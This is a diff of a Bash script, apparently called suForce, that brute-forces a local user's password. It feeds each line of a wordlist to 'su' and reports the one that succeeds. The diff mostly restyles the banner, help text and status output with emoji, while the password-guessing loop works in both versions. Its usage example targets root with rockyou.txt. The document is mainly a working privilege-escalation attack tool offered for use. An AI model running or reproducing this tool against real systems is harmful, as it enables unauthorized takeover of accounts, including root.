@@ -6,110 +6,80 @@ readonly YELLOW="\e[93m"
 readonly BLUE="\e[94m"
 readonly WHITE="\e[97m"
 readonly END="\e[0m"
-
-readonly VAR1='['
-readonly VAR2=']'
-readonly VAR3='i'
-readonly VAR4='*'
-readonly VAR5='>'
-readonly VAR6='<'
-readonly VAR7='-'
-readonly VAR8='+'
-readonly VAR9='./suForce'
-readonly VAR10='WORDLIST'
-readonly VAR11='USER'
-readonly VAR12='Usage:'
-readonly VAR13='Username:'
-readonly VAR14='Wordlist:'
-readonly VAR15='Password:'
-readonly VAR16='Line:'
-readonly VAR17='Status:'
-readonly VAR18='Fuck!'
-readonly VAR19='it was not possible to decrypt the password.'
-readonly VAR20='-=================================-'
-
-readonly BOX1="$WHITE$VAR1$GREEN$VAR8$WHITE$VAR2$END"
-readonly BOX2="$WHITE$VAR1$RED$VAR7$WHITE$VAR2$END"
-readonly BOX3="$WHITE$VAR1$YELLOW$VAR3$WHITE$VAR2$END"
-readonly BOX4="$WHITE$VAR1$BLUE$VAR4$WHITE$VAR2$END"
+readonly SEPARATOR="───────────────────────────────────"
 
 trap ctrl_c INT
 
 function banner(){
-  echo -e "$GREEN            _____                        $END"
-  echo -e "$RED ___ _   _ $GREEN|  ___|__  _ __ ___ ___   $END"
-  echo -e "$RED/ __| | | |$GREEN| |_ / _ \| '__/ __/ _ \\ $END"
-  echo -e "$RED\__ \ |_| |$GREEN|  _| (_) | | | (_|  __/  $END"
-  echo -e "$RED|___/\__,_|$GREEN|_|  \___/|_|  \___\___|  $END"
-  echo -e "$WHITE$VAR20                                   $END"
+  echo -e "${GREEN}            _____                        ${END}"
+  echo -e "${RED} ___ _   _ $GREEN|  ___|__  _ __ ___ ___   ${END}"
+  echo -e "${RED}/ __| | | |$GREEN| |_ / _ \| '__/ __/ _ \\ ${END}"
+  echo -e "${RED}\__ \ |_| |$GREEN|  _| (_) | | | (_|  __/  ${END}"
+  echo -e "${RED}|___/\__,_|$GREEN|_|  \___/|_|  \___\___|  ${END}"
+  echo -e "${SEPARATOR}"
+  echo -e " code: ${YELLOW}d4t4s3c${END}     version: ${YELLOW}v1.0.0${END}"
+  echo -e "${SEPARATOR}"
 }
 
 function help(){
-  echo
-  echo -e "$BOX3 $RED$VAR12 $WHITE$VAR9 -u $RED$VAR6$WHITE$VAR11$RED$VAR5$WHITE -w $RED$VAR6$WHITE$VAR10$RED$VAR5$END"
-  echo
+  echo -e " ❓  Usage: suForce [OPTIONS]\n"
+  echo -e " 🌐  Get a user password with the su binary.\n"
+  echo -e " 📋  Options:"
+  echo -e "       -u <USER>      Specify the username you want to attack."
+  echo -e "       -w <WORDLIST>  Specify the path where the wordlist is located."
+  echo -e "       -h             Display this help message and exit.\n"
+  echo -e " 💡  Examples:"
+  echo -e "       suForce -u root -w rockyou.txt"
+  echo -e "       suForce -h \n"
+  echo -e "${SEPARATOR}\n"
 }
 
 function info(){
-  echo -e "$BOX4 $WHITE$VAR13 $BLUE$USERNAME$END"
-  sleep 1
-  echo -e "$BOX4 $WHITE$VAR14 $BLUE$WORDLIST$END"
-  sleep 1
-  echo -e "$BOX3 $WHITE$VAR17$END"
-  sleep 1
+  echo -e "🎯 Username | ${BLUE}${USERNAME}${END}"
+  echo -e "📖 Wordlist | ${BLUE}${WORDLIST}${END}"
 }
 
 function ctrl_c(){
   echo
+  tput cnorm
   exit 1
 }
 
-while getopts ":u:w:" arg; do
-  case $arg in
+while getopts ":u:w:" ARG; do
+  case ${ARG} in
     u) USERNAME=$OPTARG; let parameter_counter+=1 ;;
     w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
   esac
 done
 
-if [ ! -z $WORDLIST ]; then
+if [[ -n "${USERNAME}" && -n "${WORDLIST}" ]]; then
   banner
-  sleep 1
-else
-  banner
-  help
-  exit 0
-fi
-
-if [ ! -z $USERNAME ]; then
   info
 else
+  banner
   help
   exit 0
 fi
 
-LINES=$(wc -l $WORDLIST)
-REGEX="([0-9]+).$WORDLIST"
-[[ $LINES =~ $REGEX ]]
+LINES=$(wc -l ${WORDLIST})
+REGEX="([0-9]+).${WORDLIST}"
+[[ ${LINES} =~ ${REGEX} ]]
 SIZ="${BASH_REMATCH[1]}"
-
 while IFS= read -r PASSWORD; do
   LINE=$((LINE + 1))
   PROGRESS=$((LINE * 100 / SIZ))
-  echo -ne "\e[?25l\r\033[K$YELLOW    $LINE/$SIZ/$PROGRESS%/$PASSWORD$END"
-  echo "$PASSWORD" | timeout 0.1 bash -c "su $USERNAME -c whoami &>/dev/null"
+  echo -ne "\e[?25l\r\033[K🔎 Status   | ${YELLOW}${LINE}/${SIZ}/${PROGRESS}%/${PASSWORD}${END}"
+  echo "${PASSWORD}" | timeout 0.1 bash -c "su ${USERNAME} -c whoami &>/dev/null"
   if [ $? -eq 0 ]; then
-    GETLINE=$(grep -n "^$PASSWORD$" $WORDLIST | cut -d ":" -f 1)
-    echo -e "\n$BOX1 $RED$VAR15 $GREEN$PASSWORD$RED $VAR16 $GREEN$GETLINE$END"
-    echo -e "$WHITE$VAR20$END"
-    echo
+    echo -e "\n💥 Password | $GREEN$PASSWORD$RED$END"
+    echo -e "${SEPARATOR}\n\n"
     sleep 2
     tput cnorm
     exit 0
   fi
-done < $WORDLIST
-echo -e "$BOX2 $RED$VAR18 $WHITE$VAR19$END"
-echo -e "$WHITE$VAR20$END"
-echo
+done < ${WORDLIST}
+echo -e "\n❗ Fuck!    | ${RED}Password not found${END}"
+echo -e "${SEPARATOR}\n\n"
 sleep 2
 tput cnorm
 exit 0
